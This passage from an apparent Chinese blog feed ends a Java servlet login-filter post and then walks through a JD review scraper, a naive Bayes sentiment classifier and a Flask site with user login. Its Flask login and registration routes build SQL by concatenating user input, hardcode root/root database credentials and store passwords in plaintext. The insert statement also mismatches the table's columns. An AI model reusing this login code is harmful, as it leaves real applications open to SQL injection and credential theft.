        <span class="hljs-type">ServletOutputStream</span> <span class="hljs-variable">os</span> <span class="hljs-operator">=</span> response.getOutputStream();
        <span class="hljs-comment">// 生成验证码图片显示在jsp页面上</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">checkCode</span> <span class="hljs-operator">=</span> CheckCodeUtil.outputVerifyImage(<span class="hljs-number">100</span>, <span class="hljs-number">50</span>, os, <span class="hljs-number">4</span>);

        <span class="hljs-comment">// 将生成的验证码信息发送到 /register 用于验证用户输入的验证码是否正确</span>
        <span class="hljs-comment">// 将验证码存入session</span>
        <span class="hljs-type">HttpSession</span> <span class="hljs-variable">codeSession</span> <span class="hljs-operator">=</span> request.getSession();
        codeSession.setAttribute(<span class="hljs-string">&quot;checkCode&quot;</span>, checkCode);
    &#125;

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doPost</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;
        doGet(request, response);
    &#125;
&#125;</code></pre>

<h3 id="权限验证"><a href="#权限验证" class="headerlink" title="权限验证"></a>权限验证</h3><p>使用javaweb的三大组件 <code>filer</code>实现</p>
<p>在<code>src/main/java/com/itheima/servler/web/filter</code>中创建<code>LoginFilter</code></p>
<pre><code class="hljs java"><span class="hljs-keyword">package</span> com.sunzy.web.filter;

<span class="hljs-keyword">import</span> javax.servlet.*;
<span class="hljs-keyword">import</span> javax.servlet.annotation.WebFilter;
<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;
<span class="hljs-keyword">import</span> javax.servlet.http.HttpSession;
<span class="hljs-keyword">import</span> java.io.IOException;

<span class="hljs-comment">//@WebFilter(&quot;/*&quot;)</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LoginFilter</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Filter</span> &#123;
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(FilterConfig config)</span> <span class="hljs-keyword">throws</span> ServletException &#123;
    &#125;

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;
    &#125;

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;
        <span class="hljs-comment">// 放行登录相关的资源</span>
        String urls[] = &#123;<span class="hljs-string">&quot;/login.jsp&quot;</span>, <span class="hljs-string">&quot;/css/&quot;</span>, <span class="hljs-string">&quot;/imgs/&quot;</span>, <span class="hljs-string">&quot;register.jsp&quot;</span>,<span class="hljs-string">&quot;/checkCode&quot;</span>,<span class="hljs-string">&quot;/register&quot;</span>,<span class="hljs-string">&quot;/login&quot;</span>&#125;;

        <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">req</span> <span class="hljs-operator">=</span> (HttpServletRequest) request;
        <span class="hljs-type">StringBuffer</span> <span class="hljs-variable">requestURL</span> <span class="hljs-operator">=</span> req.getRequestURL();
        <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> requestURL.toString();
        <span class="hljs-keyword">for</span>(String u :urls )&#123;
            <span class="hljs-keyword">if</span>(url.contains(u))&#123;
                chain.doFilter(request,response);
                <span class="hljs-keyword">return</span> ;
            &#125;

        &#125;

        <span class="hljs-type">HttpSession</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> req.getSession();
        <span class="hljs-type">Object</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> session.getAttribute(<span class="hljs-string">&quot;user&quot;</span>);
        <span class="hljs-keyword">if</span>(user != <span class="hljs-literal">null</span>)&#123;
            chain.doFilter(request, response);
        &#125;<span class="hljs-keyword">else</span> &#123;

            request.setAttribute(<span class="hljs-string">&quot;login_msg&quot;</span>, <span class="hljs-string">&quot;您尚未登录！&quot;</span>);
            request.getRequestDispatcher(<span class="hljs-string">&quot;/login.jsp&quot;</span>).forward(req, response);
        &#125;

    &#125;
&#125;
</code></pre>

]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>mybatis</tag>
        <tag>servlet</tag>
      </tags>
  </entry>
  <entry>
    <title>商品评价情感分析</title>
    <url>/2021/08/06/maliciousUrls/</url>
    <content><![CDATA[<h1 id="项目综述"><a href="#项目综述" class="headerlink" title="项目综述"></a>项目综述</h1><ul>
<li><p>对给定的文本进行自动分类，对评价分成好评和差评</p>
</li>
<li><p>支持批量检测，并进行可视化展示</p>
</li>
<li><p>对所有评价进行词云展示</p>
</li>
</ul>
<h1 id="数据获取"><a href="#数据获取" class="headerlink" title="数据获取"></a>数据获取</h1><p>爬虫获取JD的商品评价，这里主要针对智能手机的评价</p>
<ul>
<li><p>首先是分析如何获取到商品的评价</p>
</li>
<li><p>对商品评价进行提取</p>
</li>
<li><p>对获取的数据进行分类保存</p>
</li>
</ul>
<h2 id="获取评价"><a href="#获取评价" class="headerlink" title="获取评价"></a>获取评价</h2><p>首先进行搜索，比如关键词 为手机</p>
<pre><code class="hljs ini"><span class="hljs-attr">self.startUrl</span> = <span class="hljs-string">&quot;https://search.jd.com/Search?keyword=%s&amp;enc=utf-8&quot;</span> % (quote(<span class="hljs-string">&#x27;手机&#x27;</span>))  <span class="hljs-comment"># jD起始搜索页面</span></code></pre>

<p>之后获取商品的ID，可以在网页源码中提取<code>//li[@class=&quot;gl-item&quot;]/@data-sku</code>，具体的节点信息如下</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210807164810298.png" alt="image-20210807164810298"></p>
<img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210807164417239.png" alt="image-20210807164417239" style="zoom:80%;">

<p>获得商品ID后可以利用JD提供的评价API获取评论页面，如图</p>
<p>api接口如下</p>
<pre><code class="hljs apache"><span class="hljs-attribute">https</span>://sclub.jd.com/comment/productPageComments.action?productId=<span class="hljs-number">100020210392</span>&amp;score=<span class="hljs-number">3</span>&amp;sortType=<span class="hljs-number">5</span>&amp;page=<span class="hljs-number">2</span>&amp;pageSize=<span class="hljs-number">10</span>&amp;isShadowSku=<span class="hljs-number">0</span>&amp;rid=<span class="hljs-number">0</span>&amp;fold=<span class="hljs-number">1</span></code></pre>

<p>其中需要改变的参数为</p>
<ul>
<li><p>productId  商品ID</p>
</li>
<li><p>score 评论的分类 1为差评 2为中评 3为好评</p>
</li>
<li><p>page 评论的页数</p>
</li>
</ul>
<img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210807164923145.png" alt="image-20210807164923145" style="zoom:80%;">

<p>获取这个页面后就是对数据进行提取</p>
<h2 id="数据提取"><a href="#数据提取" class="headerlink" title="数据提取"></a>数据提取</h2><blockquote>
<p> 这里为了方便，先将提取到的数据保存在csv文件中，之后再写入到数据库中</p>
</blockquote>
<p>上图中我们需要提取的数据只有评价部分的内容和打分数，也就是，content和socore的数据</p>
<p>这里可以将网页数据转换成json数据后提取，很方便</p>
<img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210807165659199.png" alt="image-20210807165659199" style="zoom:80%;">

<pre><code class="hljs python">res_json = json.loads(response.text)
<span class="hljs-keyword">for</span> cdit <span class="hljs-keyword">in</span> res_json[<span class="hljs-string">&#x27;comments&#x27;</span>]:
	<span class="hljs-comment"># comment = cdit[&#x27;content &#x27;].replace(&quot;\n&quot;, &#x27; &#x27;)</span>
	comment = cdit[<span class="hljs-string">&#x27;content&#x27;</span>].replace(<span class="hljs-string">&quot;\n&quot;</span>, <span class="hljs-string">&#x27; &#x27;</span>).replace(<span class="hljs-string">&#x27;\r&#x27;</span>, <span class="hljs-string">&#x27; &#x27;</span>)
	comments.append(comment)
	scores.append(cdit[<span class="hljs-string">&#x27;score&#x27;</span>])
	<span class="hljs-built_in">print</span>(comment)</code></pre>

<h2 id="数据保存"><a href="#数据保存" class="headerlink" title="数据保存"></a>数据保存</h2><pre><code class="hljs python">savepath = <span class="hljs-string">&#x27;./&#x27;</span> + self.categlory + <span class="hljs-string">&#x27;_&#x27;</span> + self.comtype[score] + <span class="hljs-string">&#x27;.csv&#x27;</span>
logging.warning(<span class="hljs-string">&quot;已爬取%d 条 %s 评价信息&quot;</span> % (<span class="hljs-built_in">len</span>(comments), self.comtype[score]))
<span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(savepath, <span class="hljs-string">&#x27;a+&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf8&#x27;</span>) <span class="hljs-keyword">as</span> f:
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(comments)):
	    f.write(<span class="hljs-string">&quot;%d\t%s\t%s\n&quot;</span> % (i, scores[i], comments[i]))
logging.warning(<span class="hljs-string">&quot;数据已保存在 %s&quot;</span> % (savepath))</code></pre>

<h1 id="贝叶斯分类"><a href="#贝叶斯分类" class="headerlink" title="贝叶斯分类"></a>贝叶斯分类</h1><blockquote>
<p>1.加载语料，打乱语料顺序，将语料分为评论和好评&#x2F;差评<br>2.去除评论中的英文、停用词<br>3.将全部语料按1:4分为测试集与训练集<br>4.使用CountVectorize构造词袋模型<br>5.使用TfidfTransformer计算tf-idf值作为特征																																				6.选择多个分类器进行分类(也可以只用一个，这里只用了多项式)<br>7.选择合适的模型并保存</p>
</blockquote>
<h2 id="加载语料"><a href="#加载语料" class="headerlink" title="加载语料"></a>加载语料</h2><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">load_corpus</span>(<span class="hljs-params">file_path_pos,file_path_nag</span>):
    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(file_path_pos, <span class="hljs-string">&#x27;r&#x27;</span>,encoding=<span class="hljs-string">&#x27;UTF-8&#x27;</span>) <span class="hljs-keyword">as</span> f:
        reader = csv.reader(f)
        rows = [row <span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> reader]
    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(file_path_nag, <span class="hljs-string">&#x27;r&#x27;</span>,encoding=<span class="hljs-string">&#x27;UTF-8&#x27;</span>) <span class="hljs-keyword">as</span> f:
        reader = csv.reader(f)
        rows_2 = [row <span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> reader]
    rows.extend(rows_2)
    <span class="hljs-comment"># 将读取出来的语料转为list</span>
    review_data = np.array(rows).tolist()
    <span class="hljs-comment"># 打乱语料的顺序</span>
    random.shuffle(review_data)
    review_list = []
    sentiment_list = []
    <span class="hljs-comment"># 第一列为差评/好评， 第二列为评论</span>
    <span class="hljs-keyword">for</span> words <span class="hljs-keyword">in</span> review_data:
        review_list.append(words[<span class="hljs-number">0</span>].split(<span class="hljs-string">&quot;\t&quot;</span>)[<span class="hljs-number">2</span>])
        <span class="hljs-keyword">if</span>(words[<span class="hljs-number">0</span>].split(<span class="hljs-string">&quot;\t&quot;</span>)[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;5&#x27;</span>):
            sentiment_list.append(<span class="hljs-number">1</span>)
        <span class="hljs-keyword">else</span>:
            sentiment_list.append(<span class="hljs-number">0</span>)
    <span class="hljs-keyword">return</span> review_list, sentiment_list</code></pre>

<p>生成的数据如下</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210808144639597.png" alt="image-20210808144639597"></p>
<h2 id="去除评论中的英文、停用词"><a href="#去除评论中的英文、停用词" class="headerlink" title="去除评论中的英文、停用词"></a>去除评论中的英文、停用词</h2><p>这一步的目的是方便后面的词频统计</p>
<pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">load_stopwords</span>(<span class="hljs-params">file_path</span>):  <span class="hljs-comment"># 加载停顿词</span>
    stop_words = []
    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(file_path, encoding=<span class="hljs-string">&#x27;UTF-8&#x27;</span>) <span class="hljs-keyword">as</span> words:
       stop_words.extend([i.strip() <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> words.readlines()])
    <span class="hljs-keyword">return</span> stop_words


<span class="hljs-keyword">def</span> <span class="hljs-title function_">review_to_text</span>(<span class="hljs-params">review</span>):
    stop_words = load_stopwords(stopword_path)
    <span class="hljs-comment"># 去除英文</span>
    review = re.sub(<span class="hljs-string">&quot;[^\u4e00-\u9fa5^a-z^A-Z]&quot;</span>, <span class="hljs-string">&#x27;&#x27;</span>, review)
    <span class="hljs-comment"># print(review)</span>
    review = jieba.cut(review)
    <span class="hljs-comment"># 去掉停用词，将句子划分成一个个的单词 例如：[&#x27;赞赞赞&#x27;, &#x27;不错&#x27;, &#x27;很漂亮&#x27;, &#x27;外壳&#x27;]</span>
    words = []
    <span class="hljs-keyword">if</span> stop_words:
        all_stop_words = <span class="hljs-built_in">set</span>(stop_words)
        words = [w <span class="hljs-keyword">for</span> w <span class="hljs-keyword">in</span> review <span class="hljs-keyword">if</span> w <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> all_stop_words]
    <span class="hljs-built_in">print</span>(words[:<span class="hljs-number">4</span>])
    <span class="hljs-keyword">return</span> words</code></pre>

<p>最后经过处理</p>
<pre><code class="hljs python">review_train = [<span class="hljs-string">&#x27; &#x27;</span>.join(review_to_text(review)) <span class="hljs-keyword">for</span> review <span class="hljs-keyword">in</span> train_review_list]
review_test = [<span class="hljs-string">&#x27; &#x27;</span>.join(review_to_text(review)) <span class="hljs-keyword">for</span> review <span class="hljs-keyword">in</span> test_review_list]</code></pre>

<p>呈现如下的效果</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210808144300246.png" alt="image-20210808144300246"></p>
<h2 id="训练模型"><a href="#训练模型" class="headerlink" title="训练模型"></a>训练模型</h2><pre><code class="hljs python"><span class="hljs-comment"># 加载语料</span>
review_list, sentiment_list = load_corpus(file_path_pos,file_path_nag)

<span class="hljs-comment"># 将全部语料按1:4分为测试集与训练集</span>
n = <span class="hljs-built_in">len</span>(review_list) // <span class="hljs-number">5</span>
train_review_list, train_sentiment_list = review_list[n:], sentiment_list[n:]
test_review_list, test_sentiment_list = review_list[:n], sentiment_list[:n]

<span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;训练集数量： &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(train_review_list))))
<span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;测试集数量： &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(test_review_list))))

<span class="hljs-comment"># 用于训练的评论</span>
review_train = [<span class="hljs-string">&#x27; &#x27;</span>.join(review_to_text(review)) <span class="hljs-keyword">for</span> review <span class="hljs-keyword">in</span> train_review_list] <span class="hljs-comment"># 将句子中的单词重新拼接，形成无停顿词的句子</span>
<span class="hljs-comment"># 对于训练评论对应的好评/差评</span>
sentiment_train = train_sentiment_list

<span class="hljs-comment"># 用于测试的评论</span>
review_test = [<span class="hljs-string">&#x27; &#x27;</span>.join(review_to_text(review)) <span class="hljs-keyword">for</span> review <span class="hljs-keyword">in</span> test_review_list]
<span class="hljs-built_in">print</span>(review_test[:<span class="hljs-number">3</span>])
<span class="hljs-comment"># 对于测试评论对应的好评/差评</span>
sentiment_test = test_sentiment_list

vectorizer = CountVectorizer(max_df=<span class="hljs-number">0.8</span>, min_df=<span class="hljs-number">3</span>)
tfidftransformer = TfidfTransformer()

<span class="hljs-comment"># 先转换成词频矩阵，再计算TFIDF值</span>
tfidf = tfidftransformer.fit_transform(vectorizer.fit_transform(review_train))
<span class="hljs-comment"># 朴素贝叶斯中的多项式分类器，训练模型</span>
clf = MultinomialNB().fit(tfidf, sentiment_train)

<span class="hljs-comment"># 将模型保存pickle文件</span>
<span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(model_export_path, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> file:
    d = &#123;
        <span class="hljs-string">&quot;clf&quot;</span>: clf,
        <span class="hljs-string">&quot;vectorizer&quot;</span>: vectorizer,
        <span class="hljs-string">&quot;tfidftransformer&quot;</span>: tfidftransformer,
    &#125;
    pickle.dump(d, file)

<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;训练完成&quot;</span>)</code></pre>



<p>使用测试数据集验证该模型的准确性</p>
<pre><code class="hljs python">count_vec = CountVectorizer(max_df=<span class="hljs-number">0.8</span>, min_df=<span class="hljs-number">3</span>)
tfidf_vec = TfidfTransformer()
<span class="hljs-comment"># 定义Pipeline对全部步骤的流式化封装和管理，可以很方便地使参数集在新数据集（比如测试集）上被重复使用。</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">MNB_Classifier</span>():
    <span class="hljs-keyword">return</span> Pipeline([
        (<span class="hljs-string">&#x27;count_vec&#x27;</span>, count_vec),
        (<span class="hljs-string">&#x27;tfidf_vec&#x27;</span>, tfidf_vec),
        (<span class="hljs-string">&#x27;mnb&#x27;</span>, MultinomialNB())
    ])
mnbc_clf = MNB_Classifier()
<span class="hljs-comment"># 进行训练</span>
mnbc_clf.fit(review_train, sentiment_train)
<span class="hljs-comment"># 测试集准确率</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;测试集准确率： &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(mnbc_clf.score(review_test, sentiment_test)))</code></pre>

<p>准确性可以达到88%，是一个不错的结果</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210808154411255.png" alt="image-20210808154411255"></p>
<h1 id="可视化网页"><a href="#可视化网页" class="headerlink" title="可视化网页"></a>可视化网页</h1><h2 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h2><p>将爬取的评论写入数据库，将网页中输入的检测数据和结果写入数据库，以及用户登录账号密码</p>
<p>所以需要三个数据表保存上面提到的三种数据</p>
<p>这里使用脚本一键完成</p>
<pre><code class="hljs python"><span class="hljs-comment"># -*- coding = utf - 8 -*-</span>
<span class="hljs-comment">#@Time : 2021/8/6 22:35</span>
<span class="hljs-comment">#@Author : sunzy</span>
<span class="hljs-comment">#@File : db_helper.py</span>

<span class="hljs-keyword">import</span> re
<span class="hljs-keyword">import</span> csv
<span class="hljs-keyword">import</span> random
<span class="hljs-keyword">import</span> pymysql
conn = pymysql.connect(host=<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, user=<span class="hljs-string">&#x27;root&#x27;</span>, password=<span class="hljs-string">&#x27;root&#x27;</span>, port=<span class="hljs-number">3306</span>, db=<span class="hljs-string">&#x27;goods&#x27;</span>,
                       charset=<span class="hljs-string">&#x27;utf8mb4&#x27;</span>)
<span class="hljs-keyword">def</span> <span class="hljs-title function_">createTable</span>():
    sql = <span class="hljs-string">&quot;create table comment(id int primary key auto_increment,comment varchar(800) CHARACTER SET &#x27;utf8&#x27;,type varchar(200) CHARACTER SET &#x27;utf8&#x27;)&quot;</span>
    cur = conn.cursor()
    cur.execute(sql)
    cur.close()

<span class="hljs-keyword">def</span> <span class="hljs-title function_">createTable1</span>():
    sql = <span class="hljs-string">&quot;create table user(id int primary key auto_increment,username varchar(80),password varchar(200))&quot;</span>
    cur = conn.cursor()
    cur.execute(sql)
    cur.close()


<span class="hljs-keyword">def</span> <span class="hljs-title function_">createTable2</span>():
    sql = <span class="hljs-string">&quot;create table result(id int primary key auto_increment,comment varchar(800) CHARACTER SET &#x27;utf8&#x27;,type varchar(200) CHARACTER SET &#x27;utf8&#x27;)&quot;</span>
    cur = conn.cursor()
    cur.execute(sql)
    cur.close()

createTable()
createTable1()
createTable2()

<span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;手机_nagetive.csv&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>, encoding=<span class="hljs-string">&#x27;UTF-8&#x27;</span>) <span class="hljs-keyword">as</span> f:
    reader = csv.reader(f)
    <span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> reader:
        r = <span class="hljs-string">&#x27;&#x27;</span>.join(row)
        cursor = conn.cursor()
        cursor.execute(<span class="hljs-string">&quot;insert into `comment` values(null, %s, &#x27;差评&#x27;)&quot;</span>,
                       (r.split()[<span class="hljs-number">2</span>]));
        conn.commit()
        cursor.close()
<span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;手机_positive.csv&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>, encoding=<span class="hljs-string">&#x27;UTF-8&#x27;</span>) <span class="hljs-keyword">as</span> f:
    reader = csv.reader(f)
    <span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> reader:
        r = <span class="hljs-string">&#x27;&#x27;</span>.join(row)
        cursor = conn.cursor()
        cursor.execute(<span class="hljs-string">&quot;insert into `comment` values(null, %s, &#x27;好评&#x27;)&quot;</span>,
                       (r.split()[<span class="hljs-number">2</span>]));

        conn.commit()
        cursor.close()</code></pre>

<h2 id="用户注册和登录"><a href="#用户注册和登录" class="headerlink" title="用户注册和登录"></a>用户注册和登录</h2><p>用户的注册和登录逻辑很简单，就是与数据库进行交互</p>
<pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/addUser&#x27;</span>,methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">addUser</span>():
    get_json = request.get_json()
    name = get_json[<span class="hljs-string">&#x27;name&#x27;</span>]
    password = get_json[<span class="hljs-string">&#x27;password&#x27;</span>]
    conn = pymysql.connect(host=<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, user=<span class="hljs-string">&#x27;root&#x27;</span>, password=<span class="hljs-string">&#x27;root&#x27;</span>, port=<span class="hljs-number">3306</span>, db=<span class="hljs-string">&#x27;goods&#x27;</span>,
                           charset=<span class="hljs-string">&#x27;utf8mb4&#x27;</span>)
    cursor = conn.cursor()
    sql = <span class="hljs-string">&quot;insert into `user` values(null,&#x27;&quot;</span>+name+<span class="hljs-string">&quot;&#x27;,&#x27;&quot;</span>+password+<span class="hljs-string">&quot;&#x27;,&#x27;user&#x27;)&quot;</span>
    cursor.execute(sql);
    conn.commit()
    table_result = &#123;<span class="hljs-string">&quot;code&quot;</span>: <span class="hljs-number">200</span>, <span class="hljs-string">&quot;msg&quot;</span>: <span class="hljs-string">&quot;成功&quot;</span>&#125;
    cursor.close()
    conn.close()
    <span class="hljs-keyword">return</span> jsonify(table_result)

<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/loginByPassword&#x27;</span>,methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">loginByPassword</span>():
    get_json = request.get_json()
    name = get_json[<span class="hljs-string">&#x27;name&#x27;</span>]
    password = get_json[<span class="hljs-string">&#x27;password&#x27;</span>]
    conn = pymysql.connect(host=<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, user=<span class="hljs-string">&#x27;root&#x27;</span>, password=<span class="hljs-string">&#x27;root&#x27;</span>, port=<span class="hljs-number">3306</span>, db=<span class="hljs-string">&#x27;goods&#x27;</span>,
                           charset=<span class="hljs-string">&#x27;utf8mb4&#x27;</span>)
    cursor = conn.cursor()
    cursor.execute(<span class="hljs-string">&quot;select count(*) from `user` where `username` = &#x27;&quot;</span> + name +<span class="hljs-string">&quot;&#x27; and password = &#x27;&quot;</span> + password+<span class="hljs-string">&quot;&#x27;&quot;</span>);
    count = cursor.fetchall()
    <span class="hljs-keyword">if</span>(count[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] != <span class="hljs-number">0</span>):
        table_result = &#123;<span class="hljs-string">&quot;code&quot;</span>: <span class="hljs-number">200</span>, <span class="hljs-string">&quot;msg&quot;</span>: name&#125;
    <span class="hljs-keyword">else</span>:
        table_result = &#123;<span class="hljs-string">&quot;code&quot;</span>: <span class="hljs-number">500</span>, <span class="hljs-string">&quot;msg&quot;</span>: <span class="hljs-string">&quot;失败&quot;</span>&#125;
    cursor.close()
    conn.close()
    <span class="hljs-keyword">return</span> jsonify(table_result)</code></pre>

<p>用户成功登录后，js脚本会重定向到index.html页面，进入系统主页</p>
<pre><code class="hljs js">form.<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;submit(login-submit)&#x27;</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params">obj</span>) &#123;
            $.<span class="hljs-title function_">ajax</span>(&#123;
                <span class="hljs-attr">type</span>: <span class="hljs-string">&quot;post&quot;</span>,
                <span class="hljs-attr">contentType</span>: <span class="hljs-string">&#x27;application/json&#x27;</span>,
                <span class="hljs-attr">url</span>: <span class="hljs-string">&quot;http://127.0.0.1:5000/loginByPassword&quot;</span>,
                <span class="hljs-attr">data</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(obj.<span class="hljs-property">field</span>),
                <span class="hljs-attr">dataType</span>: <span class="hljs-string">&#x27;json&#x27;</span>,
                <span class="hljs-attr">success</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">data</span>) &#123;
                    <span class="hljs-keyword">if</span> (data.<span class="hljs-property">code</span> == <span class="hljs-string">&#x27;200&#x27;</span>) &#123;
                        layer.<span class="hljs-title function_">msg</span>(<span class="hljs-string">&#x27;登录成功&#x27;</span>,
                            &#123;
                                <span class="hljs-attr">icon</span>: <span class="hljs-number">1</span>,
                                <span class="hljs-attr">time</span>: <span class="hljs-number">1500</span>
                            &#125;, <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;
                                location.<span class="hljs-title function_">replace</span>(<span class="hljs-string">&#x27;../../index.html&#x27;</span>) <span class="hljs-comment">//重定向到index.html</span>
                            &#125;)
                    &#125; <span class="hljs-keyword">else</span> &#123;
                        layer.<span class="hljs-title function_">alert</span>(data.<span class="hljs-property">msg</span>, &#123;<span class="hljs-attr">icon</span>: <span class="hljs-number">2</span>&#125;, <span class="hljs-keyword">function</span> (<span class="hljs-params">index</span>) &#123;
                            layer.<span class="hljs-title function_">close</span>(index);
                        &#125;);
                    &#125;
                &#125;
            &#125;)
            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
        &#125;);</code></pre>

<h2 id="词云展示"><a href="#词云展示" class="headerlink" title="词云展示"></a>词云展示</h2><p>使用echarts生成词云</p>
<pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/top&#x27;</span>,methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">top</span>():
    jsondata = &#123;&#125;
    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">len</span>(request.args)!=<span class="hljs-number">0</span>):
        <span class="hljs-keyword">if</span>(request.args[<span class="hljs-string">&#x27;category&#x27;</span>]==<span class="hljs-string">&#x27;good&#x27;</span>):
            jsondata[<span class="hljs-string">&#x27;data&#x27;</span>] = good_datas
        <span class="hljs-keyword">else</span>:
            jsondata[<span class="hljs-string">&#x27;data&#x27;</span>] = bad_datas
    <span class="hljs-keyword">else</span>:
        jsondata[<span class="hljs-string">&#x27;data&#x27;</span>] = all_datas
    j = jsonify(jsondata)
    <span class="hljs-built_in">print</span>(j)
    <span class="hljs-keyword">return</span> j</code></pre>

<p>数据获取</p>
<pre><code class="hljs python">cursor.execute(<span class="hljs-string">&quot;select comment from `comment`&quot;</span>);
data_dict = []
result = cursor.fetchall()
<span class="hljs-keyword">for</span> field <span class="hljs-keyword">in</span> result:
    data_dict.append(field[<span class="hljs-string">&#x27;comment&#x27;</span>])
content = <span class="hljs-string">&#x27;&#x27;</span>.join(data_dict)
all_datas = []
jieba.analyse.set_stop_words(<span class="hljs-string">&#x27;./stopwords.txt&#x27;</span>)
tags = jieba.analyse.extract_tags(content, topK=<span class="hljs-number">100</span>, withWeight=<span class="hljs-literal">True</span>)
<span class="hljs-keyword">for</span> v, n <span class="hljs-keyword">in</span> tags:
    mydict = &#123;&#125;
    mydict[<span class="hljs-string">&quot;name&quot;</span>] = v
    mydict[<span class="hljs-string">&quot;value&quot;</span>] = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">int</span>(n * <span class="hljs-number">10000</span>))
    all_datas.append(mydict)
cursor.close()</code></pre>

<p>js脚本</p>
<pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">init</span>(<span class="hljs-params"></span>) &#123;
					form.<span class="hljs-title function_">render</span>();
					$.<span class="hljs-title function_">ajax</span>(&#123;
						<span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;GET&#x27;</span>,
						<span class="hljs-attr">url</span>: <span class="hljs-string">&#x27;http://127.0.0.1:5000/top&#x27;</span>,
						<span class="hljs-attr">beforeSend</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">XMLHttpRequest</span>) &#123;
							<span class="hljs-comment">//注意，layer.msg默认3秒自动关闭，如果数据加载耗时比较长，需要设置time</span>
							loadingFlag = layer.<span class="hljs-title function_">msg</span>(<span class="hljs-string">&#x27;正在读取数据，请稍候……&#x27;</span>, &#123;
								<span class="hljs-attr">icon</span>: <span class="hljs-number">16</span>,
								<span class="hljs-attr">shade</span>: <span class="hljs-number">0.01</span>,
